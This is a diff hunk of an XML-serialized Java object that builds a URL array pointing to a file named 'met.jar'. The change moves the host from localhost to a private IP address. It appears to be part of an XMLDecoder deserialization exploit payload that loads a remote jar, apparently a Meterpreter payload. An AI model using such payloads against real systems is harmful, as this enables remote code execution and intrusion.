@@ -7,7 +7,7 @@
 		<array class="java.net.URL" length="1"> 
 		 	<void index="0"> 
 		 		<object class="java.net.URL">	
-		 			<string>http://localhost/~alvaro/met.jar</string>
+		 			<string>http://192.168.239.1/~alvaro/met.jar</string>
 		 		</object>
 			</void> 
 		</array> 
